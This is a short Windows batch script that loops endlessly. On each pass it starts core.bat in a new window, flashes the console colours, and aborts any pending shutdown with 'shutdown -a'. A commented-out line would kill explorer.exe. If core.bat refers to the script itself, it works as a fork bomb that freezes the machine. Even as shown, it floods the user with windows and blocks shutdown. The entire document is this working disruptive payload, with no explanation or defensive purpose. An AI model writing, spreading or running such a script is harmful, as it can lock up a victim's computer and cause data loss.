@echo off
:s
start "hh" core.bat
color f0
color 40
shutdown -a
rem taskkill /f /im explorer.exe
goto s